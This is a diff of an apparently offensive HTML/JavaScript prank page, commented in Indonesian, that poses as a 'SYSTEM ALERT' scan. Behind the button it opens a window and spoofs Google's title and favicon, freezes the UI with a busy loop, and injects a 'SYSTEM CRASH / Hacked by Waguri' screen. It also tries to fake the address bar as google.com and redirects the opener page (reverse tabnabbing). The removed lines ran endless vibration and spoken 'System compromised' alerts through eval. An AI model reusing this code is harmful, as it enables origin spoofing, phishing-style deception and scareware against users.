@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Google Favicon Spoofing + Tabnabbing</title>
+<title>UI Freeze / Stale Origin Spoofing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Favicon Spoofing + Tabnabbing).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (UI Freeze / Stale Origin).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -55,7 +55,7 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu Favicon Spoofing + Tabnabbing...";
+    statusDiv.textContent = "Memicu Stale Origin Spoofing...";
 
     function picuTerusMenerus() {
         dipicu++;
@@ -65,17 +65,20 @@ startBtn.addEventListener("click", function() {
             
             if (w) {
                 try {
-                    // 2. TITLE BAR SPOOFING
+                    // 2. TITLE BAR & FAVICON SPOOFING
                     w.document.title = "Google";
-
-                    // 3. FAVICON SPOOFING (Memasukkan logo Google ke tab bar)
                     const link = w.document.createElement('link');
                     link.rel = 'icon';
-                    // Menggunakan URL logo Google resmi
                     link.href = 'https://www.google.com/favicon.ico'; 
                     w.document.head.appendChild(link);
 
-                    // 4. Suntikkan konten "SYSTEM CRASH"
+                    // 3. UI FREEZE: Blokir Main Thread sebentar untuk menghentikan render
+                    const start = Date.now();
+                    while (Date.now() - start < 500) {
+                        // CPU Freeze selama 500ms
+                    }
+
+                    // 4. SUNTIKKAN KONTEN PENYERANG (Saat UI Freeze)
                     w.document.body.style.margin = "0";
                     w.document.body.style.padding = "0";
                     w.document.body.style.background = "#000";
@@ -91,37 +94,27 @@ startBtn.addEventListener("click", function() {
                         <div>
                             <h1 style="font-size:60px; text-shadow:0 0 20px #f00; animation:pulse 0.5s infinite;">SYSTEM CRASH</h1>
                             <p style="color:#0f0; font-size:20px;">Hacked by Waguri</p>
-                            <p style="color:#ff0; font-size:12px; margin-top:20px;">Favicon & Title: Google</p>
+                            <p style="color:#ff0; font-size:12px; margin-top:20px;">Stale Origin Active</p>
+                            <p style="color:#aaa; font-size:10px; margin-top:10px;">Wait for the Address Bar to update...</p>
                         </div>
                         <style>
                             @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
                         </style>
                     `;
 
-                    // 5. REVERSE TABNABBING (Belokkan halaman utama)
-                    try {
-                        if (w.opener) {
-                            w.opener.location.href = 'https://example.com'; 
-                        }
-                    } catch(e) {
-                        console.warn("Tabnabbing diblokir oleh browser: " + e.message);
-                    }
-
-                    // 6. GETAR & TTS DI TAB BARU
-                    w.eval(`
-                        if (navigator.vibrate) {
-                            setInterval(function() {
-                                navigator.vibrate([2000, 500, 2000]);
-                            }, 3000);
-                        }
-                        if ('speechSynthesis' in window) {
-                            setInterval(function() {
-                                var msg = new SpeechSynthesisUtterance('System compromised');
-                                msg.lang = 'en-US';
-                                window.speechSynthesis.speak(msg);
-                            }, 4000);
-                        }
-                    `);
+                    // 5. REVERSE TABNABBING & URL SPOOFING
+                    // Setelah freeze selesai, kita coba ganti URL Address Bar
+                    setTimeout(function() {
+                        try {
+                            // Mencoba mengganti URL ke google.com
+                            w.history.replaceState({}, '', 'https://google.com');
+                            
+                            // Belokkan halaman utama (jika diizinkan)
+                            if (w.opener) {
+                                w.opener.location.href = 'https://example.com';
+                            }
+                        } catch(e) {}
+                    }, 100);
 
                 } catch(e) {
                     console.warn("Injeksi lintas tab diblokir: " + e.message);
